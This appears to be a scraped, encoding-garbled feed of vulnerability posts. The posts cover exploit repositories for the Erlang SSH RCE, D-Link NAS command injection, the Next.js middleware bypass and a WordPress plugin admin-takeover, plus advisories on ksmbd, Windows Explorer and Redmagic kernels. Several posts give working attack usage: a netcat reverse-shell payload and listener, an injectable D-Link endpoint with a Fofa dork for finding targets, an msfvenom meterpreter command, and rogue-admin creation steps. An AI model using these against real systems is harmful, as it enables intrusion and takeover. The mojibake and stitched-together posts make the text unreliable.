posts.text: æ¼æ´ä¿¡æ¯ æ³¨: æœ¬æ¨¡å—æ¥è‡ª AI å¯èƒ½å­˜åœ¨é”™è¯¯ æ¼æ´åç§°ï¼š Erlang SSH Library è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-32433 æ¼æ´ç±»å‹ï¼š å‘½ä»¤æ‰§è¡Œ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š Erlang/OTPæ˜¯ä¸€å¥—ä¸ºErlangç¼–ç¨‹è¯­è¨€è®¾è®¡çš„åº“ã€‚åœ¨ç‰ˆæœ¬OTP-27.3.3ã€OTP-26.2.5.11å’ŒOTP-25.3.2.20ä¹‹å‰ï¼ŒSSHæœåŠ¡å™¨å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œæœªç»è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚é€šè¿‡åˆ©ç”¨SSHåè®®æ¶ˆæ¯å¤„ç†ä¸­çš„ç¼ºé™·ï¼Œæ¶æ„è¡Œä¸ºè€…å¯ä»¥åœ¨æ²¡æœ‰æœ‰æ•ˆå‡­è¯çš„æƒ…å†µä¸‹è·å¾—å¯¹å—å½±å“ç³»ç»Ÿçš„æœªæˆæƒè®¿é—®å¹¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ­¤é—®é¢˜å·²åœ¨ç‰ˆæœ¬OTP-27.3.3ã€OTP-26.2.5.11å’ŒOTP-25.3.2.20ä¸­ä¿®å¤ã€‚ä¸´æ—¶è§£å†³æ–¹æ¡ˆåŒ…æ‹¬ç¦ç”¨SSHæœåŠ¡å™¨æˆ–é€šè¿‡é˜²ç«å¢™è§„åˆ™é˜»æ­¢è®¿é—®ã€‚ äº§å“å‚å•†ï¼š Erlang/OTP äº§å“åç§°ï¼š Erlang SSH Library å½±å“ç‰ˆæœ¬ï¼š version < OTP-27.3.3, version < OTP-26.2.5.11, version < OTP-25.3.2.20 æ¥æºï¼š https://github.com/B1ack4sh/Blackash-CVE-2025-32433 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ CVE-2025-32433.py README.md åŸå§‹ä¿¡æ¯Blackash-CVE-2025-32433CVE-2025-32433 Erlang SSH Library Exploit ğŸ›‘Description:Erlang/OTP is a set of libraries for the Erlang programming language. Prior to versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20, a SSH server may allow an attacker to perform unauthenticated remote code execution (RCE). By exploiting a flaw in SSH protocol message handling, a malicious actor could gain unauthorized access to affected systems and execute arbitrary commands without valid credentials. This issue is patched in versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20. A temporary workaround involves disabling the SSH server or to prevent access via firewall rules. Metrics:CNA: GitHub, Inc. Base Score: 10.0 CRITICAL âš« Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H Features: Original exploit by Matthew Keeley Updated version by Tyler Ramsbey: Commandâ€‘line arguments for LHOST, LPORT, RHOST, and RPORT Builtâ€‘in help and usage via argparse Erlangâ€‘style reverse shell payload using os:cmd("nc LHOST LPORT -e /bin/sh"). Clean function decomposition and status logging for each stage Prerequisites: Python3 A working nc (Netcat) listener on your attack machine Network access to the target SSH service (default port 22) Usage: Start your listener on the attack box: 1nc -lvnp 4444 Run the exploit: 1python3 CVE-2025-32433.py -lh [Attacker-IP] -lp [Attacker-Port] -rh [Victim-IP] -rp [Victim-Port] Wait for the shell to connect back to your listener. Help Menu:12345678910111213141516$ python3 CVE-2025-32433.py -husage: CVE-2025-32433.py [-h] -lh LHOST -lp LPORT [-rh RHOST] [-rp RPORT]Send a pre-auth SSH channel request with an Erlang RCE payloadto get a reverse shelloptional arguments: -h, --help show this help message and exit -lh LHOST, --lhost LHOST Local host/IP to receive the reverse shell -lp LPORT, --lport LPORT Local port to receive the reverse shell -rh RHOST, --rhost RHOST Target SSH server IP (default: 10.10.10.10) -rp RPORT, --rport RPORT Target SSH server port (default: 22) Disclaimer âš ï¸For educational and research purposes only. Use only against systems you own or have permission to test.

posts.title: Linux Kernel ksmbd Use-After-Free Vulnerability
posts.text: æ¼æ´ä¿¡æ¯ æ³¨: æœ¬æ¨¡å—æ¥è‡ª AI å¯èƒ½å­˜åœ¨é”™è¯¯ æ¼æ´åç§°ï¼š Linux Kernel ksmbd Use-After-Free Vulnerability æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-37899 æ¼æ´ç±»å‹ï¼š æƒé™æå‡ æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š Linuxå†…æ ¸çš„ksmbdæ¨¡å—ä¸­å‘ç°äº†ä¸€ä¸ªuse-after-freeç±»å‹çš„æ¼æ´ï¼Œè¯¥æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…ä»¥æå‡çš„æƒé™è¿œç¨‹æ‰§è¡Œä»£ç ã€‚æ¼æ´å­˜åœ¨äºå¤„ç†SMB2/3çš„logoffå‘½ä»¤æ—¶ï¼Œå½“çº¿ç¨‹é‡Šæ”¾ä¸å¯¹è±¡sess->userå…³è”çš„å†…å­˜æ—¶ï¼Œå¦‚æœå¦ä¸€ä¸ªçº¿ç¨‹å°è¯•è®¿é—®è¿™ä¸ªå·²é‡Šæ”¾çš„å¯¹è±¡ï¼Œå¯èƒ½ä¼šå¯¼è‡´å†…å­˜æŸåï¼Œè¿›è€Œå¯èƒ½æ‰§è¡Œä»»æ„ä»£ç ã€‚ äº§å“å‚å•†ï¼š Linux äº§å“åç§°ï¼š ksmbd æ¥æºï¼š https://github.com/vett3x/SMB-LINUX-CVE-2025-37899 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ README.md åŸå§‹ä¿¡æ¯Vulnerabilidad Use-After-Free en ksmbd del Kernel de Linux (CVE-2025-37899)DescripciÃ³nSe ha descubierto una vulnerabilidad de tipo use-after-free en el mÃ³dulo ksmbd del kernel de Linux, responsable de la implementaciÃ³n del protocolo SMB (Server Message Block) para el intercambio de archivos en red. Esta vulnerabilidad, identificada como CVE-2025-37899, podrÃ­a permitir la ejecuciÃ³n remota de cÃ³digo con privilegios elevados. IntroducciÃ³nEl hallazgo fue realizado por el investigador Sean Heelan utilizando el modelo o3 de OpenAI, lo que demuestra el potencial de la inteligencia artificial en la identificaciÃ³n de vulnerabilidades complejas. La vulnerabilidad reside en el manejo del comando logoff de SMB2/3 y puede ser explotada bajo ciertas condiciones de concurrencia. Detalles TÃ©cnicosDescripciÃ³n de la VulnerabilidadLa vulnerabilidad use-after-free ocurre cuando un hilo (thread) libera la memoria asociada al objeto sess->user durante el procesamiento del comando logoff. Si otro hilo intenta acceder a este objeto liberado, se produce una condiciÃ³n de carrera que puede resultar en corrupciÃ³n de memoria y, potencialmente, en la ejecuciÃ³n de cÃ³digo arbitrario. El cÃ³digo vulnerable se encuentra en la funciÃ³n smb2_session_logoff dentro del mÃ³dulo ksmbd. La falta de sincronizaciÃ³n adecuada en el acceso al objeto sess->user permite que la memoria sea liberada mientras aÃºn estÃ¡ siendo utilizada por otro hilo. CÃ³digo Afectado (Ejemplo)1234567891011// Ejemplo simplificado del cÃ³digo vulnerablevoid smb2_session_logoff(struct ksmbd_work *work) { struct smb_session *sess = work->session; if (sess->user) { ksmbd_free_user(sess->user); // LiberaciÃ³n de la memoria sess->user = NULL; }}// Otro hilo podrÃ­a acceder a sess->user aquÃ­, despuÃ©s de la liberaciÃ³n Vectores de AtaqueUn atacante remoto podrÃ­a explotar esta vulnerabilidad enviando una serie de comandos SMB2/3 diseÃ±ados para crear una condiciÃ³n de carrera en el acceso al objeto sess->user. Esto podrÃ­a lograrse estableciendo mÃºltiples conexiones SMB y manipulando el cierre de sesiÃ³n para que coincida con el acceso concurrente al objeto. ImpactoLa explotaciÃ³n exitosa de esta vulnerabilidad podrÃ­a permitir a un atacante: Ejecutar cÃ³digo arbitrario en el sistema afectado con privilegios de kernel.Obtener acceso no autorizado a informaciÃ³n sensible.Comprometer la integridad y disponibilidad del sistema. SoluciÃ³nParchesSe recomienda aplicar los parches de seguridad proporcionados por su distribuciÃ³n de Linux a la brevedad. Las principales distribuciones ya estÃ¡n trabajando en la publicaciÃ³n de actualizaciones. 12345678910111213// DespuÃ©s (arreglado)void smb2_session_logoff(struct ksmbd_work *work) { struct smb_session *sess = work->session; spin_lock(&sess->user_lock); // Lock para proteger el acceso concurrente if (sess->user) { ksmbd_free_user(sess->user); sess->user = NULL; } spin_unlock(&sess->user_lock); // Unlock despuÃ©s de la operaciÃ³n} Y en las funciones que acceden a sess->user, tambiÃ©n se debe proteger: 1234567891011// Ejemplo de acceso seguro en otra funciÃ³nvoid smb2_check_user_session(struct smb_session *sess) { spin_lock(&sess->user_lock); if (sess->user) { // Acceso seguro a sess->user // ... } spin_unlock(&sess->user_lock);} Medidas de MitigaciÃ³nEn caso de no poder aplicar los parches de inmediato, se recomienda: Deshabilitar el mÃ³dulo ksmbd si no es necesario.Restringir el acceso al puerto SMB (445) mediante firewalls.Implementar medidas de seguridad adicionales, como la monitorizaciÃ³n de trÃ¡fico SMB y la detecciÃ³n de anomalÃ­as.ReferenciasCVE-2025-37899: Enlace al CVE (cuando estÃ© disponible)Anuncio del Descubrimiento: Enlace al artÃ­culo o publicaciÃ³n originalRepositorio del Kernel de Linux: Enlace al cÃ³digo fuente afectado AgradecimientosAgradecimiento a Sean Heelan por el descubrimiento y a la comunidad de ciberseguridad por su colaboraciÃ³n en la mitigaciÃ³n de esta vulnerabilidad.

posts.text: æ¼æ´ä¿¡æ¯ æ³¨: æœ¬æ¨¡å—æ¥è‡ª AI å¯èƒ½å­˜åœ¨é”™è¯¯ æ¼æ´åç§°ï¼š D-Link Network Attached Storage (NAS) å‘½ä»¤æ³¨å…¥æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2024-10914 æ¼æ´ç±»å‹ï¼š å‘½ä»¤æ‰§è¡Œ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š CVE-2024-10914æ˜¯ä¸€ä¸ªå½±å“å¤šæ¬¾æ—§ç‰ˆD-Linkç½‘ç»œé™„åŠ å­˜å‚¨(NAS)è®¾å¤‡çš„å…³é”®å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡å‘æ˜“å—æ”»å‡»çš„ç«¯ç‚¹å‘é€ç‰¹åˆ¶è¯·æ±‚æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ äº§å“å‚å•†ï¼š D-Link äº§å“åç§°ï¼š D-Link-DNS-ShareCenter æœç´¢è¯­æ³•ï¼š app=â€D_Link-DNS-ShareCenterâ€ && server==â€lighttpd/1.4.25-devel-fb150ffâ€ æ¥æºï¼š https://github.com/TH-SecForge/CVE-2024-10914 ç±»å‹ï¼š CVE-2024:github search ä»“åº“æ–‡ä»¶ LICENSE README.md exploit.py requirements.txt targets.txt POCè¯¦æƒ…CVE-2024-10914 - D-Link Remote Code Execution (RCE) ExploitThis script is a proof-of-concept (PoC) exploit for CVE-2024-10914, a remote code execution vulnerability in certain D-Link devices. The script identifies and exploits vulnerable devices to execute arbitrary commands. Note: This script should only be used for educational purposes or in authorized environments. Unauthorized exploitation of this vulnerability may be illegal and unethical. 1234Finding TargetsTo find potential targets, use Fofa (similar to Shodan.io):Fofa Dork: app="D_Link-DNS-ShareCenter" && server=="lighttpd/1.4.25-devel-fb150ff" Features Vulnerability Check: The script can check if a target is vulnerable to CVE-2024-10914. Exploit: Exploit the vulnerability by sending payloads to gain remote command execution. Interactive Shell: After exploitation, an interactive shell is started for executing further commands. Multi-target Scanning: Scan multiple targets from a file using multiple threads for faster vulnerability detection. Requirements Python 3.x requests (for HTTP requests) alive-progress (for progress bars) prompt_toolkit (for the interactive shell) argparse (for handling command-line arguments) To install required libraries, use: 1pip3 install -r requirements.txt Command-Line Arguments123456789101112usage: exploit.py [-h] [-u URL] [-f FILE] [-t THREADS] [-p PORT]A PoC exploit for CVE-2024-10914 - D-Link Remote Code Execution (RCE)optional arguments: -h, --help Show this help message and exit -u URL, --url URL Single target IP to test (e.g., 192.168.1.1) -f FILE, --file FILE File containing list of target IPs to scan -t THREADS, --threads THREADS Number of threads to use for scanning (default: 5) -p PORT, --port PORT Port to target (default: 80) Example Usage Check a Single Target: 1python3 exploit.py -u 192.168.1.100 -p 80 Scan Multiple Targets from a File1python3 exploit.py -f targets.txt -p 80 -t 10 Exploit DetailsThis script attempts to exploit a vulnerability in D-Link devices, specifically targeting the following Vulnerable Endpoint: /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=â€™;{};â€™ Payloads: Various system commands (id, uname -a, hostname, cat /proc/cpuinfo, etc.)The exploit is carried out by injecting system commands into the vulnerable endpoint, triggering the remote execution of arbitrary commands on the target device DisclaimerThis script is for educational purposes only. Do not use this script on systems or networks you do not have explicit permission to test. The authors are not responsible for any misuse of this tool. For more details, please refer to the official GitHub repository:https://github.com/ThemeHackers/CVE-2024-10914 ContributingIf you find any issues or want to contribute, feel free to open an issue or submit a pull request on the GitHub repository. æ¼æ´æè¿°ï¼š Microsoft Windows File Explorerå­˜åœ¨ä¸€ä¸ªæ¬ºéª—æ¼æ´ï¼Œç¼–å·ä¸ºCVE-2025-24071ã€‚è¯¥æ¼æ´æºäºWindows Explorerå¯¹.library-msæ–‡ä»¶çš„éšå¼ä¿¡ä»»å’Œè‡ªåŠ¨è§£æè¡Œä¸ºã€‚æœªç»è®¤è¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ åŒ…å«æ¶æ„SMBè·¯å¾„çš„RAR/ZIPæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚è§£å‹ç¼©æ—¶ï¼Œä¼šè§¦å‘SMBè®¤è¯è¯·æ±‚ï¼Œå¯èƒ½æ³„éœ²ç”¨æˆ·çš„NTLMå“ˆå¸Œã€‚ç›®å‰å·²æœ‰å…¬å¼€çš„PoCï¼ˆæ¦‚å¿µéªŒè¯ï¼‰åˆ©ç”¨ä»£ç ï¼Œä½¿å¾—è¯¥æ¼æ´æˆä¸ºå½“å‰å¨èƒã€‚å—å½±å“çš„ç”¨æˆ·åº”ç«‹å³åº”ç”¨è¡¥ä¸ä»¥é™ä½é£é™©ã€‚ äº§å“å‚å•†ï¼š Microsoft äº§å“åç§°ï¼š Windows File Explorer å½±å“ç‰ˆæœ¬ï¼š Windows 10 Version 1809 for x64-based Systems, Windows 10 Version 1809 for 32-bit Systems, Windows Server 2025 (Server Core installation), Windows Server 2025, Windows Server 2012 R2 (Server Core installation), Windows Server 2012 R2, Windows Server 2016 (Server Core installation), Windows Server 2016, Windows 10 Version 1607 for x64-based Systems, Windows 10 Version 1607 for 32-bit Systems, Windows 10 for x64-based Systems, Windows 10 for 32-bit Systems, Windows 11 Version 24H2 for x64-based Systems, Windows 11 Version 24H2 for ARM64-based Systems, Windows Server 2022, 23H2 Edition (Server Core installation), Windows 11 Version 23H2 for x64-based Systems, Windows 11 Version 23H2 for ARM64-based Systems, (Server Core installation), Windows Server 2022, Windows Server 2019 (Server Core installation), Windows Server 2019 æ¥æºï¼š https://github.com/TH-SecForge/CVE-2025-24071 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ LICENSE README.md exploit.py requirements.txt POCè¯¦æƒ…Security Vulnerability Report: CVE-2025-24071 - Windows File Explorer Spoofing VulnerabilityOverviewNSFOCUS CERT has detected that Microsoft recently released a security update to address a critical spoofing vulnerability in Windows File Explorer, identified as CVE-2025-24071. This vulnerability has a CVSS score of 7.5, indicating its severity. The issue arises from the implicit trust and automatic file parsing behavior of .library-ms files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the userâ€™s NTLM hash. PoC (Proof of Concept) exploits for this vulnerability are now publicly available, making it a current threat. Affected users are strongly advised to apply the patch immediately to mitigate the risk. Reference: Microsoft Security Update Scope of ImpactAffected Versions: Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows Server 2025 (Server Core installation) Windows Server 2025 Windows Server 2012 R2 (Server Core installation) Windows Server 2012 R2 Windows Server 2016 (Server Core installation) Windows Server 2016 Windows 10 Version 1607 for x64-based Systems Windows 10 Version 1607 for 32-bit Systems Windows 10 for x64-based Systems Windows 10 for 32-bit Systems Windows 11 Version 24H2 for x64-based Systems Windows 11 Version 24H2 for ARM64-based Systems Windows Server 2022, 23H2 Edition (Server Core installation) Windows 11 Version 23H2 for x64-based Systems Windows 11 Version 23H2 for ARM64-based Systems Windows 10 Version 22H2 for 32-bit Systems Windows 10 Version 22H2 for ARM64-based Systems Windows 10 Version 22H2 for x64-based Systems Windows 11 Version 22H2 for x64-based Systems Windows 11 Version 22H2 for ARM64-based Systems Windows 10 Version 21H2 for x64-based Systems Windows 10 Version 21H2 for ARM64-based Systems Windows 10 Version 21H2 for 32-bit Systems Windows Server 2022 (Server Core installation) Windows Server 2022 Windows Server 2019 (Server Core installation) Windows Server 2019 DetectionTo determine whether your system is at risk, follow these steps: Check System Version: Press Win+R, type winver, and press Enter. This will display the version and build number of your Windows operating system. Verify Patch Installation: Open Command Prompt and run systeminfo to check the details of installed patches. MitigationMicrosoft has released a security patch to address this vulnerability for all supported versions. It is crucial to apply the patch as soon as possible to protect against potential exploitation. Patch Installation: Download the patch: Microsoft Security Update Windows Update: Go to Settings â†’ Update & Security â†’ Windows Update. Check for updates and ensure the patch has been installed. View Update History: If the patch installation fails, you can view the update history or manually download the update from the Microsoft Update Catalog. If the patch fails to install through Windows Update, you can manually download and install the standalone package by visiting the Microsoft Update Catalog. For further information and updates, refer to the official Microsoft Security Response Center.

posts.text: æ¼æ´ä¿¡æ¯ æ³¨: æœ¬æ¨¡å—æ¥è‡ª AI å¯èƒ½å­˜åœ¨é”™è¯¯ æ¼æ´åç§°ï¼š Next.js æˆæƒç»•è¿‡æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-29927 æ¼æ´ç±»å‹ï¼š æƒé™ç»•è¿‡ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š CVE-2025-29927æ˜¯å½±å“Next.jsçš„ä¸€ä¸ªä¸¥é‡å®‰å…¨æ¼æ´ï¼ŒNext.jsæ˜¯ä¸€ä¸ªç”¨äºæ„å»ºå…¨æ ˆWebåº”ç”¨çš„æµè¡ŒReactæ¡†æ¶ã€‚æ­¤æ¼æ´å…è®¸æ”»å‡»è€…ç»•è¿‡Next.jsä¸­é—´ä»¶ä¸­å®ç°çš„æˆæƒæ£€æŸ¥ï¼Œå¯èƒ½æœªç»æˆæƒè®¿é—®åº”ç”¨çš„æ•æ„ŸåŒºåŸŸï¼Œå¦‚ç®¡ç†é¡µé¢æˆ–ç”¨æˆ·ä»ªè¡¨æ¿ã€‚æ¼æ´æºäºå¯¹å†…éƒ¨x-middleware-subrequestå¤´çš„ä¸å½“å¤„ç†ã€‚é€šè¿‡æ„é€ åŒ…å«æ­¤å¤´çš„è¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡ä¸­é—´ä»¶å®‰å…¨æ£€æŸ¥ï¼Œè·³è¿‡è®¤è¯å’Œæˆæƒæœºåˆ¶ã€‚ äº§å“å‚å•†ï¼š Next.js äº§å“åç§°ï¼š Next.js å½±å“ç‰ˆæœ¬ï¼š version < 14.2.25, version < 15.2.3 æ¥æºï¼š https://github.com/TH-SecForge/CVE-2025-29972 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ LICENSE README.md exploit.py requirements.txt POCè¯¦æƒ…CVE-2025-29927 - Critical Security Vulnerability in Next.jsOverviewCVE-2025-29927 is a critical security vulnerability affecting Next.js, a popular React framework for building full-stack web applications. This flaw allows attackers to bypass authorization checks implemented in Next.js middleware, potentially granting unauthorized access to sensitive areas of an application, such as admin pages or user dashboards. Vulnerability DetailsThe vulnerability arises from the improper handling of the internal x-middleware-subrequest header. By crafting requests that include this header, an attacker can bypass middleware security checks, effectively skipping authentication and authorization mechanisms. Affected Versions Next.js versions prior to 14.2.25 and 15.2.3 are vulnerable. How to use12345git clone https://github.com/ThemeHackers/CVE-2025-29972cd CVE-2025-29972python3 -m venv .venvsource .venv/bin/activatepython3 exploit.py -h Quick to use12345git clone https://github.com/ThemeHackers/CVE-2025-29972cd CVE-2025-29972python3 -m venv .venvsource .venv/bin/activatepython3 exploit.py --hostname HOSTNAME âš ï¸ Note: Ensure that your Next.js applications are always updated to the latest stable versions to prevent security risks.

posts.text: æ¼æ´åç§°ï¼š Android Dynamic Code Loading Restriction Vulnerability æ¼æ´ç±»å‹ï¼š æƒé™ç»•è¿‡ æ¼æ´ç­‰çº§ï¼š ä¸­å± æ¼æ´æè¿°ï¼š åœ¨Android 15ï¼ˆSDK 35ï¼‰ä¸Šï¼Œä½¿ç”¨Pixel 6æ‰‹æœºåˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªæ¶æ„çš„.apkæ–‡ä»¶æ—¶ï¼Œç”±äºAndroid 14å¼•å…¥çš„åŠ¨æ€ä»£ç åŠ è½½é™åˆ¶ï¼Œå¯¼è‡´Meterpreterä¼šè¯åœ¨é˜¶æ®µå‘é€åå¤±è´¥ã€‚è¿™è¡¨æ˜å­˜åœ¨ä¸€ä¸ªæƒé™ç»•è¿‡é—®é¢˜ï¼Œå¯èƒ½é€šè¿‡File.setReadOnly()è¿›è¡Œå‘åå…¼å®¹çš„ä¿®å¤ã€‚ äº§å“å‚å•†ï¼š Google äº§å“åç§°ï¼š Android å½±å“ç‰ˆæœ¬ï¼š 15 (SDK 35) æ¥æºï¼š https://github.com/rapid7/metasploit-framework/issues/20294 ç±»å‹ï¼š rapid7/metasploit-framework:github issues Steps to reproduceUsing a Pixel 6 phone running Android 15 (SDK 35).Created a payload .apk with 1msfvenom -p android/meterpreter/reverse_tcp LHOST=10.129.114.9 LPORT=4444 -o evil.apk I expect this is due to restrictions around dynamic code loading added in Android 14 (https://developer.android.com/about/versions/14/behavior-changes-14?utm_source=chatgpt.com#safer-dynamic-code-loading). I think there is an easy backwards-compatible fix with File.setReadOnly() so I will try to send a PR. Expected behaviorStage sends / is run successfully and full Meterpreter session is opened. Current behaviorPhone logs showing code loading error:Sessions are opening but fail when stage times out: Metasploit versionFramework: 6.4.55-dev-Console : 6.4.55-dev-

posts.title: WordPress Spreadsheet Price Changer for WooCommerce and WP E-commerce â€“ Light Plugin æƒé™æå‡æ¼æ´
posts.text: æ¼æ´åç§°ï¼š WordPress Spreadsheet Price Changer for WooCommerce and WP E-commerce â€“ Light Plugin æƒé™æå‡æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-48129 æ¼æ´ç±»å‹ï¼š æƒé™æå‡ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š WordPress Spreadsheet Price Changer for WooCommerce and WP E-commerce â€“ Light Plugin 2.4.37åŠæ›´æ—©ç‰ˆæœ¬å­˜åœ¨æƒé™æå‡æ¼æ´ï¼Œæœªç»è®¤è¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åˆ›å»ºç®¡ç†å‘˜çº§åˆ«çš„è´¦æˆ·ï¼Œä»è€Œå®Œå…¨æ§åˆ¶WordPressç½‘ç«™ã€‚ äº§å“å‚å•†ï¼š WordPress äº§å“åç§°ï¼š Spreadsheet Price Changer for WooCommerce and WP E-commerce â€“ Light å½±å“ç‰ˆæœ¬ï¼š <= 2.4.37 æ¥æºï¼š https://github.com/Nxploited/CVE-2025-48129 ç±»å‹ï¼š CVE-2025:github search ğŸš¨ CVE-2025-48129 - Privilege Escalation in WordPress Spreadsheet Price Changer PluginğŸ›¡ï¸ Vulnerability Summary Plugin Affected: Spreadsheet Price Changer for WooCommerce and WP E-commerce â€“ Light Vulnerable Versions: <= 2.4.37 Patched Version: âŒ No official fix available Discovered By: Patchstack | 20 May 2025 CVE ID: CVE-2025-48129 CVSS Score: 9.8 (Critical) Patch Priority: ğŸ”´ High ğŸ”¥ RiskUnauthenticated attackers can escalate privileges by creating an Administrator-level account without needing any prior access. This allows complete takeover of the WordPress site. Classified under: OWASP A7 â€“ Identification and Authentication Failures ğŸ§ª Exploit Script OverviewThis Python script targets vulnerable versions of the plugin and registers a new WordPress Administrator using only an email and password (hashed via MD5). â–¶ï¸ Example Usage1python CVE-2025-48129.py -u http://target-site.com/wordpress -mail NxploitBot@gmail.com -p nxploitadmin ğŸ“˜ Usage Help1234567891011python CVE-2025-48129.py -helpusage: CVE-2025-48129.py [-h] -u URL -mail MAIL [-p PASSWORD]CVE-2025-48129 - Unauthenticated Privilege Escalation Exploit by Khaled Alenazi (Nxploited)options: -h, --help show this help message and exit -u, --url URL Target WordPress site URL (e.g., http://site.com/) -mail, --mail MAIL Email for the new Admin account -p, --password PASSWORD Password to set (default: nxploitadmin) âœ… Successful Output Example1234567891011[*] Checking plugin version...[*] Plugin version: 2.4.37[*] Vulnerable version detected. Exploiting...[+] Exploitation successful![*] Login credentials: Username: NxploitBot@gmail.com Password: 21232f297a57a5a743894a0e4a801fc3[*] If login fails, reset the password manually via: http://target-site.com/wordpress/wp-login.php?action=lostpassword âš ï¸ Important NoteIn some cases, logging in directly with the chosen password may fail.This is not a bug in the exploit, but a result of how the vulnerable plugin passes hashed passwords to WordPressâ€™s internal user creation system. If youâ€™re unable to log in, simply reset the password via email using the following URL: 1http://target-site.com/wordpress/wp-login.php?action=lostpassword WordPress will send a password reset email to the Admin account you just created â€” granting you full access. ğŸ§¾ Legal DisclaimerThis tool is provided for educational and authorized penetration testing purposes only.The author assumes no responsibility for misuse or damage caused by this script. By: Nxploited ( Khaled_alenazi ) 1234567- CVE-2025-48129.py- LICENSE- README.md- requirements.txt

posts.title: Redmagic 9s pro Multiple Kernel Vulnerabilities
posts.text: æ¼æ´åç§°ï¼š Redmagic 9s pro Multiple Kernel Vulnerabilities æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-21832, CVE-2025-21830, CVE-2025-21829, CVE-2025-21826 æ¼æ´ç±»å‹ï¼š æƒé™æå‡ æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š åœ¨Redmagic 9s proï¼ˆNX769Jï¼‰è®¾å¤‡ä¸Šå‘ç°äº†å¤šä¸ªå·²çŸ¥æ¼æ´ï¼ˆCVE-2025-21832ã€CVE-2025-21830ã€CVE-2025-21829å’ŒCVE-2025-21826ï¼‰ï¼Œè¿™äº›æ¼æ´å½±å“äº†Androidå†…æ ¸å’Œé©±åŠ¨ç¨‹åºçš„æ ¸å¿ƒç»„ä»¶ï¼Œå°½ç®¡æœ€è¿‘æœ‰å®‰å…¨æ›´æ–°ï¼Œä½†è¿™äº›æ¼æ´ä»ç„¶å¯è¢«åˆ©ç”¨ã€‚è¿™äº›æ¼æ´åŒ…æ‹¬IONå†…å­˜åˆ†é…å™¨ä¸­çš„ä½¿ç”¨åé‡Šæ”¾æ¼æ´ã€Binderé©±åŠ¨ç¨‹åºä¸­çš„ç«æ€æ¡ä»¶ã€Adreno GPUé©±åŠ¨ç¨‹åºä¸­çš„è¾¹ç•Œæ£€æŸ¥ä¸å½“ä»¥åŠPMICå­ç³»ç»Ÿä¸­çš„æƒé™æ‰§è¡Œé”™è¯¯ã€‚è¿™äº›æ¼æ´å¯ä»¥è¢«åˆ©ç”¨æ¥è¿›è¡Œæœ¬åœ°æƒé™æå‡ã€ç»•è¿‡SELinuxå¼ºåˆ¶æ‰§è¡Œå’Œåº”ç”¨æ²™ç®±ã€å®‰è£…æŒä¹…æ€§æ¶æ„è½¯ä»¶ã€è®¿é—®æˆ–çªƒå–ç§äººæ•°æ®ä»¥åŠé€šè¿‡PMICæ¼æ´ç¦ç”¨æˆ–æŸåç¡¬ä»¶ç»„ä»¶ã€‚ äº§å“å‚å•†ï¼š Nubia/Redmagic äº§å“åç§°ï¼š Redmagic 9s pro æ¥æºï¼š https://github.com/Sh1r0ko11/redmagic-9spro-exploits ç±»å‹ï¼š CVE-2025:github search 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114# redmagic-9spro-exploitsSecurity Advisory Report: Presence of Unpatched CVEs on Redmagic 10 (NX769J)Date: June 9, 2025Device Model: Redmagic 9s pro (NX769J)Redmagic: 10Android Version: 15Kernel Version: 6.1.90Android Security Patch Level: March 1, 2025Google Play Security Update: April 1, 2025OverviewThis report documents the discovery of multiple known vulnerabilitiesâ€”specifically CVE-2025-21832, CVE-2025-21830, CVE-2025-21829, and CVE-2025-21826â€”that have been found to remain exploitable on the Redmagic 9s pro (NX769J) despite recent security updates. These Common Vulnerabilities and Exposures (CVEs) affect core components of the Android kernel and drivers, posing critical security risks. The vulnerabilities in question are publicly documented and have been previously disclosed, but remain unpatched or insufficiently mitigated on this particular device.Detailed Vulnerability Descriptions1. CVE-2025-21832 â€” Use-After-Free in Ion Memory AllocatorType: Use-After-FreeComponent: ION subsystem (memory allocator)Attack Vector: Local (privileged or unprivileged app with native code execution)Severity: HighDescription:A Use-After-Free vulnerability exists in the ION memory management subsystem, where improperly handled references allow a malicious application to trigger memory corruption. By repeatedly allocating and freeing memory in a specific sequence, an attacker can gain use-after-free conditions, which may be exploited to achieve arbitrary kernel code 